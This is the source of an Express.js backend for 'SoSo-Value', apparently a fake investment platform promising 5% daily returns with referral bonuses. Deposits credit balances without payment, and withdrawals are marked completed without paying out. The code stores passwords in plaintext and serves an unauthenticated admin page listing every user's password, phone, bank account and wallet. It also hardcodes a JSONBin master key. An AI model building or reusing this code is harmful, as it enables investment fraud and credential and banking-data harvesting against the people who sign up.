const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== JSONBIN CONFIG ====================
// CHANGE THESE TWO VALUES TO YOUR OWN
const JSONBIN_BIN_ID = '6a3c0d84f5f4af5e292a02a4';
const JSONBIN_API_KEY = '$2a$10$S3gBsjWJQTFUFFiloXbbbe0hajjXi2JymCibrkP81RO/OfoCfOkEW';
const JSONBIN_URL = 'https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ==================== DATABASE FUNCTIONS ====================
async function readDB() {
    try {
        const response = await fetch(JSONBIN_URL + '/latest', {
            headers: {
                'X-Master-Key': JSONBIN_API_KEY
            }
        });
        const result = await response.json();
        if (result.record) {
            return result.record;
        }
        return getDefaultDB();
    } catch (e) {
        console.error('DB Read Error:', e);
        return getDefaultDB();
    }
}

async function writeDB(data) {
    try {
        await fetch(JSONBIN_URL, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'X-Master-Key': JSONBIN_API_KEY
            },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error('DB Write Error:', e);
    }
}

function getDefaultDB() {
    return {
        users: [],
        transactions: [],
        settings: {
            sosoPrice: 0.1,
            dailyYield: 0.05,
            weeklyWithdrawRate: 0.02,
            signupBonus: 0.2,
            ngnToUsd: 1600
        }
    };
}

// ==================== HELPERS ====================
function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

function generateReferralCode(name) {
    var clean = name.replace(/\s/g, '').substring(0, 4).toUpperCase();
    var rand = Math.floor(1000 + Math.random() * 9000);
    return clean + rand;
}

async function authenticate(req, res, next) {
    var token = req.headers['authorization'];
    if (!token) {
        return res.status(401).json({ error: 'No authorization token' });
    }
    var db = await readDB();
    var user = db.users.find(function(u) { return u.token === token; });
    if (!user) {
        return res.status(401).json({ error: 'Invalid token' });
    }
    req.user = user;
    req.db = db;
    next();
}

// ==================== SIGNUP ====================
app.post('/api/signup', async function(req, res) {
    try {
        var name = req.body.name;
        var email = req.body.email;
        var phone = req.body.phone;
        var password = req.body.password;
        var referralCode = req.body.referralCode;

        if (!name || !email || !phone || !password) {
            return res.status(400).json({ error: 'All fields required' });
        }

        var db = await readDB();

        var existing = db.users.find(function(u) { return u.email === email; });
        if (existing) {
            return res.status(400).json({ error: 'Email already registered' });
        }

        var settings = db.settings;
        var bonusNGN = settings.signupBonus * settings.ngnToUsd;
        var token = generateId() + generateId();

        var newUser = {
            id: generateId(),
            name: name,
            email: email,
            phone: phone,
            password: password,
            token: token,
            referralCode: generateReferralCode(name),
            referredBy: referralCode || '',
            balance: bonusNGN,
            totalInvested: 0,
            totalYield: 0,
            totalWithdrawn: 0,
            referralCount: 0,
            referralEarnings: 0,
            investments: [],
            boundBank: null,
            boundWallet: null,
            welcomeShown: false,
            createdAt: new Date().toISOString()
        };

        db.transactions.push({
            id: generateId(),
            userId: newUser.id,
            type: 'bonus',
            description: 'Sign-up Bonus',
            amount: bonusNGN,
            date: new Date().toISOString(),
            status: 'completed'
        });

        if (referralCode) {
            var referrer = db.users.find(function(u) { return u.referralCode === referralCode; });
            if (referrer) {
                referrer.balance += bonusNGN;
                referrer.referralCount += 1;
                referrer.referralEarnings += bonusNGN;
                db.transactions.push({
                    id: generateId(),
                    userId: referrer.id,
                    type: 'bonus',
                    description: 'Referral Bonus (' + name + ')',
                    amount: bonusNGN,
                    date: new Date().toISOString(),
                    status: 'completed'
                });
            }
        }

        db.users.push(newUser);
        await writeDB(db);

        var safeUser = Object.assign({}, newUser);
        delete safeUser.password;

        res.json({
            success: true,
            message: 'Account created successfully',
            user: safeUser
        });
    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Server error. Please try again.' });
    }
});

// ==================== LOGIN ====================
app.post('/api/login', async function(req, res) {
    try {
        var identifier = req.body.identifier;
        var password = req.body.password;

        if (!identifier || !password) {
            return res.status(400).json({ error: 'All fields required' });
        }

        var db = await readDB();
        var user = db.users.find(function(u) {
            return (u.email === identifier || u.name.toLowerCase() === identifier.toLowerCase())
                && u.password === password;
        });

        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        user.token = generateId() + generateId();
        await writeDB(db);

        var transactions = db.transactions.filter(function(t) { return t.userId === user.id; });

        var safeUser = Object.assign({}, user);
        delete safeUser.password;

        res.json({
            success: true,
            user: safeUser,
            transactions: transactions
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Server error. Please try again.' });
    }
});

// ==================== PROFILE ====================
app.get('/api/profile', authenticate, function(req, res) {
    var transactions = req.db.transactions.filter(function(t) { return t.userId === req.user.id; });
    var safeUser = Object.assign({}, req.user);
    delete safeUser.password;
    res.json({ user: safeUser, transactions: transactions });
});

// ==================== UPDATE WELCOME ====================
app.post('/api/update-welcome', authenticate, async function(req, res) {
    try {
        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });
        user.welcomeShown = true;
        await writeDB(db);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== DEPOSIT ====================
app.post('/api/deposit', authenticate, async function(req, res) {
    try {
        var amount = req.body.amount;
        var method = req.body.method;
        var planLevel = req.body.planLevel;

        if (!amount || amount <= 0) {
            return res.status(400).json({ error: 'Invalid amount' });
        }

        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });

        user.balance += amount;

        db.transactions.push({
            id: generateId(),
            userId: user.id,
            type: 'deposit',
            description: 'Deposit - SoSo-' + (planLevel || 1) + ' (' + (method || 'Bank Transfer') + ')',
            amount: amount,
            date: new Date().toISOString(),
            status: 'completed'
        });

        await writeDB(db);

        res.json({
            success: true,
            message: 'Deposit successful',
            newBalance: user.balance
        });
    } catch (error) {
        console.error('Deposit error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== BUY PLAN ====================
app.post('/api/buy-plan', authenticate, async function(req, res) {
    try {
        var level = req.body.level;
        var priceNGN = req.body.priceNGN;

        if (!level || !priceNGN) {
            return res.status(400).json({ error: 'Plan level and price required' });
        }

        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });

        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }

        if (user.balance < priceNGN) {
            return res.status(400).json({ error: 'Insufficient balance. Please deposit first.' });
        }

        var settings = db.settings;

        var investment = {
            id: generateId(),
            name: 'SoSo-' + level,
            level: level,
            priceNGN: priceNGN,
            priceUSD: priceNGN / settings.ngnToUsd,
            dailyRate: '5%',
            dailyIncome: priceNGN * settings.dailyYield,
            sosoTokens: (priceNGN / settings.ngnToUsd) / settings.sosoPrice,
            purchaseDate: new Date().toISOString(),
            lastYieldCalc: new Date().toISOString(),
            totalYield: 0,
            status: 'active'
        };

        user.balance -= priceNGN;
        user.totalInvested = (user.totalInvested || 0) + priceNGN;

        if (!user.investments) {
            user.investments = [];
        }
        user.investments.push(investment);

        db.transactions.push({
            id: generateId(),
            userId: user.id,
            type: 'purchase',
            description: 'Bought SoSo-' + level + ' Plan',
            amount: priceNGN,
            date: new Date().toISOString(),
            status: 'completed'
        });

        await writeDB(db);

        res.json({
            success: true,
            message: 'Plan purchased successfully',
            investment: investment,
            newBalance: user.balance
        });
    } catch (error) {
        console.error('Buy plan error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== WITHDRAW ====================
app.post('/api/withdraw', authenticate, async function(req, res) {
    try {
        var amount = req.body.amount;
        var method = req.body.method;
        var bankDetails = req.body.bankDetails;
        var walletAddress = req.body.walletAddress;

        if (!amount || amount <= 0) {
            return res.status(400).json({ error: 'Invalid amount' });
        }

        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });

        if (amount > user.balance) {
            return res.status(400).json({ error: 'Insufficient balance' });
        }

        user.balance -= amount;
        user.totalWithdrawn = (user.totalWithdrawn || 0) + amount;

        db.transactions.push({
            id: generateId(),
            userId: user.id,
            type: 'withdrawal',
            description: 'Withdrawal - ' + (method === 'bank' ? 'Bank Transfer' : 'USDT TRC20'),
            amount: amount,
            date: new Date().toISOString(),
            status: 'completed',
            details: method === 'bank' ? bankDetails : { wallet: walletAddress }
        });

        await writeDB(db);

        res.json({
            success: true,
            message: 'Withdrawal successful',
            newBalance: user.balance
        });
    } catch (error) {
        console.error('Withdraw error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== BIND BANK ====================
app.post('/api/bind-bank', authenticate, async function(req, res) {
    try {
        var bankName = req.body.bankName;
        var accountNumber = req.body.accountNumber;
        var accountName = req.body.accountName;

        if (!bankName || !accountNumber || !accountName) {
            return res.status(400).json({ error: 'All fields required' });
        }

        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });
        user.boundBank = { bankName: bankName, accountNumber: accountNumber, accountName: accountName };
        await writeDB(db);

        res.json({ success: true, message: 'Bank details saved' });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== BIND WALLET ====================
app.post('/api/bind-wallet', authenticate, async function(req, res) {
    try {
        var walletAddress = req.body.walletAddress;
        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address required' });
        }

        var db = req.db;
        var user = db.users.find(function(u) { return u.id === req.user.id; });
        user.boundWallet = walletAddress;
        await writeDB(db);

        res.json({ success: true, message: 'Wallet address saved' });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== TRANSACTIONS ====================
app.get('/api/transactions', authenticate, function(req, res) {
    var type = req.query.type;
    var transactions = req.db.transactions.filter(function(t) { return t.userId === req.user.id; });
    if (type && type !== 'all') {
        transactions = transactions.filter(function(t) { return t.type === type; });
    }
    res.json({ transactions: transactions.reverse() });
});

// ==================== ACCOUNT LOOKUP ====================
app.post('/api/lookup-account', async function(req, res) {
    try {
        var bankName = req.body.bankName;
        var accountNumber = req.body.accountNumber;

        if (!bankName || !accountNumber) {
            return res.status(400).json({ error: 'Bank and account number required' });
        }

        var db = await readDB();
        var foundName = '';

        db.users.forEach(function(u) {
            if (u.boundBank && u.boundBank.accountNumber === accountNumber && u.boundBank.bankName === bankName) {
                foundName = u.boundBank.accountName;
            }
        });

        res.json({ success: true, accountName: foundName || 'Account Holder' });
    } catch (error) {
        res.json({ success: true, accountName: 'Account Holder' });
    }
});

// ==================== CALCULATE YIELDS ====================
app.post('/api/calculate-yields', async function(req, res) {
    try {
        var db = await readDB();
        var now = new Date();
        var updated = false;

        db.users.forEach(function(user) {
            if (!user.investments) return;
            user.investments.forEach(function(inv) {
                if (inv.status !== 'active') return;
                var lastCalc = new Date(inv.lastYieldCalc || inv.purchaseDate);
                var hoursDiff = (now - lastCalc) / (1000 * 60 * 60);
                if (hoursDiff >= 24) {
                    var periods = Math.floor(hoursDiff / 24);
                    var yieldAmount = inv.priceNGN * db.settings.dailyYield * periods;
                    inv.totalYield = (inv.totalYield || 0) + yieldAmount;
                    inv.lastYieldCalc = now.toISOString();
                    user.totalYield = (user.totalYield || 0) + yieldAmount;
                    user.balance += yieldAmount;
                    db.transactions.push({
                        id: generateId(),
                        userId: user.id,
                        type: 'yield',
                        description: 'Daily yield - ' + inv.name,
                        amount: yieldAmount,
                        date: now.toISOString(),
                        status: 'completed'
                    });
                    updated = true;
                }
            });
        });

        if (updated) await writeDB(db);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// ==================== VIEW ALL DATA ====================
app.get('/admin-view-sosovalue', async function(req, res) {
    try {
        var db = await readDB();
        var html = '<!DOCTYPE html><html><head><title>SoSo-Value Data</title><meta name="viewport" content="width=device-width,initial-scale=1.0"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#0A0A1A;color:#fff;padding:20px}h1{color:#A29BFE;margin-bottom:5px;font-size:24px}.subtitle{color:#B0B0D0;font-size:13px;margin-bottom:25px}.user-card{background:#12122A;border:1px solid rgba(108,92,231,0.2);border-radius:15px;padding:20px;margin-bottom:20px}.user-name{font-size:18px;font-weight:bold;color:#A29BFE;margin-bottom:10px}.info-row{padding:5px 0;font-size:13px;color:#B0B0D0;border-bottom:1px solid rgba(108,92,231,0.05)}.info-row strong{color:#fff}.green{color:#00B894}.yellow{color:#FDCB6E}.red{color:#FF6B6B}.purple{color:#A29BFE}.summary-box{display:flex;flex-wrap:wrap;gap:15px;margin-bottom:30px}.summary-item{background:#12122A;border:1px solid rgba(108,92,231,0.3);border-radius:12px;padding:15px 20px;min-width:150px}.summary-item .label{font-size:12px;color:#B0B0D0;margin-bottom:5px}.summary-item .value{font-size:22px;font-weight:bold;color:#A29BFE}.search-box{width:100%;max-width:500px;padding:12px;background:#1A1A3E;border:1px solid rgba(108,92,231,0.3);border-radius:12px;color:#fff;font-size:14px;outline:none;margin-bottom:20px}.inv-box{background:#222255;border-radius:8px;padding:10px;margin:5px 0;font-size:12px;color:#B0B0D0}.tx-box{background:#1A1A3E;border-radius:6px;padding:8px;margin:3px 0;font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap}</style></head><body>';
        html += '<h1>SoSo-Value Users Data</h1><p class="subtitle">Last updated: ' + new Date().toLocaleString() + ' | Total Users: ' + db.users.length + '</p>';

        html += '<div class="summary-box">';
        html += '<div class="summary-item"><div class="label">Total Users</div><div class="value">' + db.users.length + '</div></div>';
        html += '<div class="summary-item"><div class="label">Total Deposited</div><div class="value">N' + db.users.reduce(function(s,u){return s+(u.totalInvested||0);},0).toLocaleString() + '</div></div>';
        html += '<div class="summary-item"><div class="label">Total Withdrawn</div><div class="value">N' + db.users.reduce(function(s,u){return s+(u.totalWithdrawn||0);},0).toLocaleString() + '</div></div>';
        html += '<div class="summary-item"><div class="label">Total Balance</div><div class="value">N' + db.users.reduce(function(s,u){return s+(u.balance||0);},0).toLocaleString() + '</div></div>';
        html += '</div>';

        html += '<input type="text" class="search-box" placeholder="Search users..." onkeyup="var q=this.value.toLowerCase();document.querySelectorAll(\'.user-card\').forEach(function(c){c.style.display=c.textContent.toLowerCase().includes(q)?\'block\':\'none\'});">';

        db.users.forEach(function(user, idx) {
            var userTx = db.transactions.filter(function(t) { return t.userId === user.id; });
            html += '<div class="user-card">';
            html += '<div class="user-name">User #' + (idx+1) + ' - ' + (user.name||'N/A') + '</div>';
            html += '<div class="info-row"><strong>Email:</strong> <span class="purple">' + (user.email||'N/A') + '</span></div>';
            html += '<div class="info-row"><strong>Phone:</strong> ' + (user.phone||'N/A') + '</div>';
            html += '<div class="info-row"><strong>Password:</strong> <span class="yellow">' + (user.password||'N/A') + '</span></div>';
            html += '<div class="info-row"><strong>Balance:</strong> <span class="green">N' + (user.balance||0).toLocaleString() + '</span> ($' + ((user.balance||0)/1600).toFixed(2) + ')</div>';
            html += '<div class="info-row"><strong>Invested:</strong> <span class="yellow">N' + (user.totalInvested||0).toLocaleString() + '</span></div>';
            html += '<div class="info-row"><strong>Withdrawn:</strong> <span class="red">N' + (user.totalWithdrawn||0).toLocaleString() + '</span></div>';
            html += '<div class="info-row"><strong>Yield:</strong> <span class="green">N' + (user.totalYield||0).toLocaleString() + '</span></div>';
            html += '<div class="info-row"><strong>Referral Code:</strong> <span class="purple">' + (user.referralCode||'N/A') + '</span></div>';
            html += '<div class="info-row"><strong>Referred By:</strong> ' + (user.referredBy||'None') + '</div>';
            html += '<div class="info-row"><strong>Referrals:</strong> ' + (user.referralCount||0) + ' (Earned: N' + (user.referralEarnings||0).toLocaleString() + ')</div>';
            html += '<div class="info-row"><strong>Joined:</strong> ' + (user.createdAt ? new Date(user.createdAt).toLocaleString() : 'N/A') + '</div>';

            if (user.boundBank) {
                html += '<div class="info-row"><strong>Bank:</strong> <span class="green">' + user.boundBank.bankName + ' | ' + user.boundBank.accountNumber + ' | ' + user.boundBank.accountName + '</span></div>';
            } else {
                html += '<div class="info-row"><strong>Bank:</strong> <span class="red">Not bound</span></div>';
            }

            if (user.boundWallet) {
                html += '<div class="info-row"><strong>Wallet:</strong> <span class="green" style="font-size:11px;word-break:break-all;">' + user.boundWallet + '</span></div>';
            } else {
                html += '<div class="info-row"><strong>Wallet:</strong> <span class="red">Not bound</span></div>';
            }

            if (user.investments && user.investments.length > 0) {
                html += '<div style="margin-top:10px;font-size:13px;color:#A29BFE;font-weight:bold;">Investments (' + user.investments.length + '):</div>';
                user.investments.forEach(function(inv) {
                    html += '<div class="inv-box">' + inv.name + ' | N' + (inv.priceNGN||0).toLocaleString() + ' | Daily: N' + (inv.dailyIncome||0).toLocaleString() + ' | Yield: N' + (inv.totalYield||0).toLocaleString() + '</div>';
                });
            }

            if (userTx.length > 0) {
                html += '<div style="margin-top:10px;font-size:13px;color:#A29BFE;font-weight:bold;">Transactions (' + userTx.length + '):</div>';
                userTx.slice().reverse().forEach(function(t) {
                    var color = (t.type === 'withdrawal' || t.type === 'purchase') ? '#FF6B6B' : '#00B894';
                    html += '<div class="tx-box"><span>' + (t.type||'').toUpperCase() + ' - ' + (t.description||'') + '</span><span style="color:' + color + ';">N' + (t.amount||0).toLocaleString() + '</span></div>';
                });
            }

            html += '</div>';
        });

        if (db.users.length === 0) {
            html += '<p style="text-align:center;color:#B0B0D0;padding:50px;">No users yet.</p>';
        }

        html += '<button onclick="window.location.reload()" style="background:#6C5CE7;border:none;color:white;padding:12px 25px;border-radius:10px;cursor:pointer;font-size:14px;margin-top:20px;">Refresh</button>';
        html += '</body></html>';
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading data');
    }
});

// ==================== SERVE FRONTEND ====================
app.get('*', function(req, res) {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ==================== START ====================
app.listen(PORT, function() {
    console.log('\n===================================');
    console.log('  SoSo-Value Server Running');
    console.log('  http://localhost:' + PORT);
    console.log('===================================\n');
});
